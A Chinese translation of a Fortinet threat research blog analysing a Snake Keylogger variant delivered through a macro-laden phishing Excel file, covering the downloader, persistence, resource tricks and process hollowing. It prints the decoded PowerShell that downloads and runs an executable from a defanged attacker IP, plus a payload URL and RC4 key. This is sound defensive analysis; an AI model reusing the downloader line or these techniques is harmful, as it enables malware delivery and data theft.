**译者：知道创宇404实验室翻译组  
原文链接：**
## 前言
Fortinet 的 FortiGuard 实验室最近发现了一个用于传播恶意软件的微软 Excel 样本。在研究了它的行为之后，我发现它是 Snake
Keylogger 恶意软件的一个新变种。
Snake
Keylogger是一个模块化的`.NET`键盘记录器。它最早出现在2020年末，主要行为是从受害者的设备中窃取敏感信息，包括保存的证书、受害者的按键、受害者屏幕的截图和剪贴板数据。
2021年7月，Snake Keylogger 首次进入 TOP 10大流行恶意软件报告，这意味着 Snake Keylogger
影响力正在增加，并威胁更多人的设备和敏感数据。
在这个威胁研究博客中，你将了解 Snake Keylogger 的变体是如何通过捕获的 Excel
样本下载和执行的，这个变体使用了什么技术来保护它不被分析，它从受害者的机器上窃取了什么敏感信息，以及它如何将收集到的数据提交给攻击者。
我们开始吧。
## 捕获的 Microsoft Excel 样本是什么样子
此 Excel 样本以钓鱼邮件附件的形式发送，内含恶意的 Macro VBA
代码。下图显示了该文件打开时的屏幕截图。它会显示一个模糊的文档图片，并要求受害者点击黄色按钮以获得一个更清晰的图像。
打开 Excel 文件时的内容
一旦受害者单击黄色按钮“ Enable Content”，恶意的 `VBA` 代码就会在后台执行。这个恶意宏项目包含恶意 VBA
代码，受密码保护，因此分析程序无法查看该代码。但是，我们可以修改它的二进制文件来消除这个限制。
检查其代码时，在打开文档时会自动调用“`Workbook _ activate()`”方法。它将一段 `PowerShell`代码从本地变量写入到 BAT
文件中。下图显示了此方法的部分 VBA 代码，其中变量“s”保存 PowerShell 代码，“`Gqyztfbtsogpnruooqr.BAT`”是
BAT 文件，最后通过调用代码“ `x = Shell (BAT，0)`”执行。
在后台执行的宏 VBA 代码
图的底部显示了变量“ s”的内容，其中包含执行时由`PowerShell.exe`解码的`base64`编码的PowerShell代码。
下面是 base64解码的 PowerShell 代码:
    $ProcName = "Wheahmnfpgaqse.exe";
    (New-Object System.Net.WebClient). DownloadFile ("hxxp[:]//3[.]64[.]251[.]139/v3/2/Requests07520000652.exe","$env:APPDATA\$ProcName");
    Start-Process ("$env:APPDATA\$ProcName")
PowerShell 代码非常简单且易于理解。它将一个文件(“`Requests07520000652.exe`”)下载到受害者的设备上，通过调用“
`DownloadFile ()`”将其置于“`% AppData% Wheahmnfpgaqse.exe`”，并通过调用“`Start-Process
()`”执行该文件。
## Snake Keylogger 下载程序
经过一些研究，我了解到“`Wheahmnfpgaqse.exe`”文件是 Snake Keylogger
的下载程序，它是一个.Net程序。当它启动时，它会休眠21秒，用以绕过沙盒，并在触发无动作超时的时候终止示例进程。
在休眠后下载和解密 Snake Keylogger 模块
21秒后，下载程序调用一个名为“ `Consturctor
()`”的函数，如图所示。然后调用另一个函数“`Program.List_Types()`”，其中它从链接“`hxxps[:]//store2[.]gofile[.]io/download/0283e6ba-afc6-4dcb-b2f4-3173d666e2c4/Huzeigtmvaplpinhoo.dll`”下载 Snake Keylogger 模块，它是
`RC4`加密的 DLL 文件。接下来，它调用“ `ToRc ()`”函数来使用解密密钥“`Dllzjn`”对 RC4进行解密。
然后它继续加载解密的 Dll 模块(一个.Net Dll 文件，名为“ `huzeigtmvaplpinhoo.Dll`”) ，并枚举它的导出函数以查找“
`G6doICqoMU ()`”，该函数通过执行函数`Consturctor
()`中的“`type.InvokeMember(\“G6doICqoMU\”，BindingFlags.InvokeMethodnull，null，null，null)`”调用。如图所示。已经解密的.Net
Dll 是 Snake Keylogger的种植和安装程序。
让我们深入这个模块，看看它是如何执行任务的。
## Snake Keylogger 安装程序
根据我的分析，解密的 Dll 模块(“ huzeigtmvplpinhoo.Dll”)将 Snake Keylogger
部署到受害者的设备上，并将其设置为自动运行程序。它从 Resource 目录中提取一个可执行的 PE 文件到内存中，然后执行进程空心化，将可执行的 PE
文件注入到新创建的子进程中并执行它。
我将在本节中详细解释它是如何执行这些功能的。
### 1.持久性机制
调试器 dnSpy 中导出函数“ G6doICqoMU ()”的中断
上图显示了解密的 Dll 模块(“
huzeigtmvplpinhoo.Dll”)的大纲。如图所见，为了防止其代码被分析，文件被模糊化，因此类名、函数名和变量名都是随机生成的无意义字符串，分析人员分析它时会很麻烦。
导出函数“ G6doICqoMU ()”的全名是“ `huzeigtmvaplpinhoo!
pxfqpio3clcaofxfj.corfgloyrglurywdwih.G6doICqoMU
()`”。同样，出于同样的目的，它在这个函数开始时休眠35秒，以绕过一些恶意软件分析系统。
接下来，它将使这个 Snake Keylogger 程序在受感染的 Windows 上持久化。众所周知，Windows
系统在“开始菜单”中有一个“启动”文件夹。该文件夹中的程序在 Windows
启动时启动。该文件夹的完整路径在系统注册表中定义，字符串值为“`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell
Folders\Startup`”和“`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User
Shell Folders\Startup`”。“
Startup”的值数据默认为“`C:\Users\{UserName}\AppData\Roaming\Microsoft\Windows\Start
Menu\Programs\Startup`”。
Snake Keylogger 的这个变体将“ Startup”的值改为其他文件夹的值。下图显示，通过调用 `API SetValue ()`将
Windows 启动文件夹更改为“`C:\Users\M0YTes0Env\AppData\Roaming\Microsoft\Windows\Start
Menu\Programs\chsg\`”的代码。 在图的下半部分，您可以看到系统注册表路径、值名称和新值数据的内容。
将 Windows“ Startup”文件夹更改为新路径
“`chsg`”是由 Snake Keylogger 创建的一个新文件夹。程序将 Snake Keylogger 文件(下载的“
`Wheahmnfpgaqse.exe`”)复制到这个文件夹中，并将其重命名为“`sgosr.exe`”。这可以确保每次启动 Snake
Keylogger程序时，Windows 系统都会启动它。
### 2.从资源中提取
尽管 Huzeigtmvaplpinhoo.dll 的内容只出现在内存中，但为了分析它，我将它保存到一个本地文件中。它在 Resource
目录中有几个资源，如下图所示。
Huzeigtmvaplpinhoo.dll的资源目录显示
提取 Snake Keylogger 的有效负载文件的过程有点复杂。它使用了一种狡猾的方式来加载资源。它有一个由 `ResolveEventHandler`
定义的本地回调函数，该函数注册到 `AppDomain.ResourceResolve`，当它未能按名称加载资源时会被调用。它看起来像是
windowsSEH
策略处理异常的异常处理程序。此外，它还有另一个注册到`AppDomain.AssemblyResolve`的本地回调函数，当它未能按名称加载程序集(如模块)时会被调用。
下面是注册本地资源解析的伪代码，其中`T9wOjU5ccxTJaVfUntn. Osc50oil0l`是本地回调函数。
    AppDomain.ResourceResolve += new ResolveEventHandler(T9wOjU5ccxTJaVfUntn.Osc50oil0l)
现在，让我们看看 Snake Keylogger
是如何解决这个挑战的——加载一个不存在的资源，这将触发资源加载失败。它计划从当前模块中读取一个名为“`Qkxkikeg`”的资源，该模块在 Resource
目录中没有这样的命名资源，如图所示。资源加载失败提示出现，注册的本地`ResolveEventHandler`
函数被调用来解决此错误。这将导致加载程序集失败，其程序集解析回调函数被调用。
不久之后，从“`{ d977ee8c-85ce-4731-b9a1-323ba88c6eeb }`”资源解密的另一个 PE
文件出现在内存中。它包含一个名为“Qkxkikeg”的资源，这是原始请求资源名称，如图所示。
另一个模块中的“Qkxkikeg”资源
Snake Keylogger 的有效负载是 GZIP 格式压缩文件，存在于 Resource 目录“
ClassLibrary1.Properties”下的资源“Qkxkikeg”中。
下图左侧显示资源“ Qkxkikeg”(反向)的 GZIP 数据，右侧显示解压缩的 Snake Keylogger。
“Qkxkikeg”的压缩和解压缩数据
### 3.进程空洞化
然后，该程序创建一个挂起的子进程，并将压缩的 Snake Keylogger
有效负载部署到子进程中。然后恢复要运行的子进程。同时，父进程通过调用`Environment.Exit(0)`函数退出。
创建一个挂起的子进程
根据上图中的代码，它将调用`API CreateProcess ()`来创建子进程，并使用`Creation Flag 134217732U
(0x80000004)` ，也就是 `CREATE_NO_WINDOW` 和`CREATE_SUSPENDED`。
然后调用`API WriteProcessMemory ()`将 Snake Keylogger 有效负载逐节复制到子进程中。然后调用
`SetThreadContext ()` ，使子进程指向 Snake Keylogger 的入口点函数。在父进程退出之前，将调用一个 API
resumread ()来还原子进程以便运行。